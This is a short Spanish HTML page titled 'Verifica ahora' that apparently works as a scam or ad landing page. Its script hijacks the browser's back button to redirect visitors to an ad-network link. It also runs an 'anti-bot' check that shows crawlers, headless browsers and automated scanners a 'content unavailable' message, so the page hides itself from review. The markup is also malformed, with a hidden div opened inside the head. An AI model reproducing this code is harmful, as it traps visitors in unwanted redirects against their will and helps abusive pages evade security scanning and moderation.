<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifica ahora</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #000;
    }
    img {
      max-width: 90%;
      height: auto;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    img:hover {
      transform: scale(1.03);
    }
  </style>
  <script>
    // BACK BUTTON redirect
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      location.href = "https://www.profitableratecpm.com/p3qb4zi8my?key=b9ee17cb90fc7adf696fe5a9fc0682b7";
    };

    // Filtro Anti-bot bÃ¡sico
    const isBot = () => {
      return (
        navigator.webdriver ||
        /HeadlessChrome/.test(window.navigator.userAgent) ||
        /bot|crawl|spider/i.test(navigator.userAgent) ||
        !navigator.userAgent ||
        !navigator.language ||
        !window.chrome
      );
    };

    if (isBot()) {
      document.write("<h1>Contenido no disponible</h1>");
      throw new Error("Bot detectado");
    }
  </script>

  <div style="visibility:hidden">

</head>
